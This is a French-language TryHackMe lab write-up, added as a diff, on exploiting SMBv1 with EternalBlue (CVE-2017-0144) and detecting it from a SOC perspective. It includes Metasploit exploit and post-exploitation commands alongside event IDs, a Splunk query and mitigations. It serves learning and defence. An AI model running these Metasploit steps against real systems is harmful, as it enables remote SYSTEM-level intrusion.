@@ -1,0 +1,62 @@
+# MS17-010 EternalBlue - Analyse SOC
+
+## Informations
+- Plateforme : TryHackMe  
+- CVE : CVE-2017-0144  
+- Difficulté : Easy  
+- Date : 19/02/2026  
+
+## Objectif
+Exploiter SMBv1 via EternalBlue et observer les traces d’attaque pour un profil SOC.
+
+## Reconnaissance
+**Outils :** Nmap, Enum4linux, Metasploit auxiliary SMB scan  
+**Résultats :** Ports 139/445 ouverts, utilisateur `Jon`, partages SMB accessibles.
+
+## Exploitation
+**Vulnérabilité :** Buffer overflow SMBv1 → exécution de code SYSTEM  
+**Commandes :**
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS <IP_CIBLE>
+set LHOST <AttackBox>
+
+**Post-exploitation :**
+sessions -i 1
+getuid
+cd C:\Users\Jon\Desktop
+type user.txt
+
+## Détection & IoC
+
+**Logs Windows :**
+* Event ID 4688 : création processus svchost.exe par lsass.exe
+* Event ID 4624 : connexion réussie
+* Event ID 5140 : accès aux partages SMB
+
+**IoC réseau :** rafale de paquets SMB malformés sur port 445
+**IoC système :** migration de processus, élévation privilèges, fichiers temporaires suspects
+
+**Exemple de log :**
+EventID: 4688
+Process: C:\Windows\System32\svchost.exe
+Parent: lsass.exe
+User: NT AUTHORITY\SYSTEM
+
+
+**Détection SIEM / Splunk :**
+index=windows EventCode=4688 
+| where Process_Name="svchost.exe" AND Parent_Process_Name="lsass.exe"
+
+
+## Mitigation
+
+* Appliquer MS17-010
+* Désactiver SMBv1 : `Set-SmbServerConfiguration -EnableSMB1Protocol $false`
+* Bloquer port 445 sortant
+* Déploiement EDR et monitoring Event ID 4688
+
+## Ce que j’ai appris
+
+* EternalBlue exploite un protocole SMBv1 obsolète
+* Importance des logs système et réseau pour la détection SOC
+* Méthodologie TryHackMe : reconnaissance → exploitation → post-exploitation → détection
